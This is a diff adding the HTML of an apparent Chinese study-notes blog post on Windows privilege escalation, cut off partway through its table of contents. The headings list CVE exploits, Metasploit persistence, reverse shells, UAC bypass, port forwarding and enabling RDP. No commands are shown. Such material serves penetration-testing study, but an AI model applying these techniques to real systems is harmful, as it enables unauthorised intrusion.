@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="windows 基础知识用户与组在 windows 中不用的用户有着不同的权限，权限主要包括有：完全控制、修改、读取和执行、列出文件夹内容、读取、写入等，其中超级管理员和 system 用户权限级别最高。 常见内置用户Administrator，系统默认管理员账号，拥有对系统的完全控制权，权限很高 Guest，来宾账号，提供访问共享资源的网络用户使用，仅具有基本权限，默认被禁用 system，系统">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 提权小结">
+<meta property="og:url" content="http://example.com/posts/2555275458/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="windows 基础知识用户与组在 windows 中不用的用户有着不同的权限，权限主要包括有：完全控制、修改、读取和执行、列出文件夹内容、读取、写入等，其中超级管理员和 system 用户权限级别最高。 常见内置用户Administrator，系统默认管理员账号，拥有对系统的完全控制权，权限很高 Guest，来宾账号，提供访问共享资源的网络用户使用，仅具有基本权限，默认被禁用 system，系统">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634018504/Xnip2021-10-12_14-00-42_sbnut2.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634019913/Xnip2021-10-12_14-24-35_l6xevn.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634020998/Xnip2021-10-12_14-42-44_qa8u4m.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634021627/Xnip2021-10-12_14-53-36_t70666.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634021855/Xnip2021-10-12_14-57-00_cd4wct.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634023896/2881634023822_.pic_hd_rpaqmk.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634025538/Xnip2021-10-12_15-58-46_yt8pqj.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634025648/Xnip2021-10-12_16-00-39_e9iey3.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634026643/55_upy0xa.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634026881/Xnip2021-10-12_16-21-10_mi4ofq.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634031010/Xnip2021-10-12_17-29-55_jhdbsl.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634031109/Xnip2021-10-12_17-31-35_q1vrne.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634031875/Xnip2021-10-12_17-44-09_votde7.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634035143/Xnip2021-10-12_18-38-53_fd9a0y.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634038349/Xnip2021-10-12_19-32-13_qgr0zz.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634093366/Xnip2021-10-13_10-49-09_aock2u.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634093569/Xnip2021-10-13_10-52-36_syqden.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634108784/Xnip2021-10-13_15-06-07_xv2mdi.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634113570/Xnip2021-10-13_16-25-17_gcsdc3.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634116416/Xnip2021-10-13_17-13-23_vhzf28.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634118007/Xnip2021-10-13_17-39-53_raj22b.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634603300/Xnip2021-10-19_08-27-58_fxmgx9.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634604853/Xnip2021-10-19_08-50-30_fib8ti.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634604858/Xnip2021-10-19_08-51-56_rgombo.png">
+<meta property="article:published_time" content="2021-10-12T09:41:46.000Z">
+<meta property="article:modified_time" content="2022-03-21T08:24:53.495Z">
+<meta property="article:author" content="lin">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>Windows 提权小结</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/797525311/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/2854784317/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/2555275458/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/2555275458/&text=Windows 提权小结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/2555275458/&title=Windows 提权小结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/2555275458/&is_video=false&description=Windows 提权小结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Windows 提权小结&body=Check out this article: http://example.com/posts/2555275458/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/2555275458/&title=Windows 提权小结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/2555275458/&title=Windows 提权小结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/2555275458/&title=Windows 提权小结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/2555275458/&title=Windows 提权小结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/2555275458/&name=Windows 提权小结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/2555275458/&t=Windows 提权小结"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">windows 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84"><span class="toc-number">1.1.</span> <span class="toc-text">用户与组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.</span> <span class="toc-text">常见内置用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">1.3.</span> <span class="toc-text">内置用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text">windows 常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-sid-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.5.</span> <span class="toc-text">windows sid 简介</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.</span> <span class="toc-text">windows 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">提权常用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">提权常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">windows 漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9"><span class="toc-number">2.4.</span> <span class="toc-text">windows 提权辅助</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%8F%AF%E5%86%99%E7%9B%AE%E5%BD%95%E6%88%96%E8%80%85%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.</span> <span class="toc-text">查询可写目录或者文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-1675-Windows-Print-Spooler-%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">CVE-2021-1675 Windows Print Spooler 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-3225%EF%BC%88MS16-075%EF%BC%89-%E7%83%82%E5%9C%9F%E8%B1%86-%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">CVE-2016-3225（MS16-075） 烂土豆 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">4.3.</span> <span class="toc-text">洞影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E-exp-%E4%B8%8B%E8%BD%BD"><span class="toc-number">4.4.</span> <span class="toc-text">漏洞 exp 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.5.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2014-4113-MS14-058-%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">CVE-2014-4113 (MS14-058) 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">5.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-0787-%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">CVE-2020-0787 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">6.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E-exp-%E4%B8%8B%E8%BD%BD-1"><span class="toc-number">6.3.</span> <span class="toc-text">漏洞 exp 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">6.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">6.5.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">msf 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-number">7.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">7.2.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%A8%A1%E5%9D%97"><span class="toc-number">7.3.</span> <span class="toc-text">windows 常见的权限提升模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">7.4.</span> <span class="toc-text">msf 基础命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81%E6%83%85%E5%86%B5"><span class="toc-number">7.5.</span> <span class="toc-text">查询系统补丁情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">7.6.</span> <span class="toc-text">权限维持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92-shell-%E4%B8%8E%E9%9D%9E%E4%BA%A4%E4%BA%92-shell"><span class="toc-number">8.</span> <span class="toc-text">交互 shell 与非交互 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92-shell"><span class="toc-number">8.1.</span> <span class="toc-text">交互 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E4%BA%A4%E4%BA%92-shell"><span class="toc-number">8.2.</span> <span class="toc-text">非交互 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc-%E5%8F%8D%E5%BC%B9-shell-%E6%8F%90%E6%9D%83"><span class="toc-number">8.3.</span> <span class="toc-text">nc 反弹 shell 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E5%8F%8D%E5%BC%B9-shell-%E6%8F%90%E6%9D%83"><span class="toc-number">8.4.</span> <span class="toc-text">powershell 反弹 shell 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nishang-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">8.5.</span> <span class="toc-text">nishang 反弹 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="toc-number">9.</span> <span class="toc-text">windows 系统配置错误提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">9.1.</span> <span class="toc-text">系统服务配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">9.1.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">9.1.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%8F%90%E6%9D%83"><span class="toc-number">9.2.</span> <span class="toc-text">不带引号的服务路径提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">9.2.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="toc-number">9.2.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E9%94%AE-AlwaysInstallElevated"><span class="toc-number">9.3.</span> <span class="toc-text">注册键 AlwaysInstallElevated</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">9.3.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5"><span class="toc-number">9.3.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">9.3.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">9.4.</span> <span class="toc-text">自动安装配置文件提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-1"><span class="toc-number">9.4.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6"><span class="toc-number">9.4.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0-dll-%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">10.</span> <span class="toc-text">本地 dll 劫持提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-2"><span class="toc-number">10.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7"><span class="toc-number">10.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text">第三方服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-SERVER-%E6%8F%90%E6%9D%83"><span class="toc-number">11.1.</span> <span class="toc-text">SQL SERVER 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-2"><span class="toc-number">11.1.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-8"><span class="toc-number">11.1.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.</span> <span class="toc-text">mysql 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#udf-%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.1.</span> <span class="toc-text">udf 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-3"><span class="toc-number">11.2.2.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-9"><span class="toc-number">11.2.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-%E6%8F%90%E6%9D%83%E9%97%AE%E9%A2%98"><span class="toc-number">11.2.4.</span> <span class="toc-text">mysql 提权问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mof-%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.5.</span> <span class="toc-text">mof 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-4"><span class="toc-number">11.2.6.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="toc-number">11.2.7.</span> <span class="toc-text">漏洞影响版本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#G6FTP-%E6%8F%90%E6%9D%83"><span class="toc-number">11.3.</span> <span class="toc-text">G6FTP 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">11.3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">11.3.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-10"><span class="toc-number">11.3.3.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uac-bypass"><span class="toc-number">12.</span> <span class="toc-text">uac bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-5"><span class="toc-number">12.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-11"><span class="toc-number">12.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LCX-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">13.</span> <span class="toc-text">LCX 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B"><span class="toc-number">13.1.</span> <span class="toc-text">工具简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">13.2.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">13.3.</span> <span class="toc-text">本地转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">13.4.</span> <span class="toc-text">远程转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E9%97%AE%E9%A2%98"><span class="toc-number">14.</span> <span class="toc-text">相关远程终端问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.1.</span> <span class="toc-text">注册表开启 3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E5%91%BD%E4%BB%A4%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.2.</span> <span class="toc-text">MSF 命令开启 3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.3.</span> <span class="toc-text">一条命令开启 3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC-%E5%91%BD%E4%BB%A4%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.4.</span> <span class="toc-text">WMIC 命令开启 3389</span></a></li><li class="toc-item 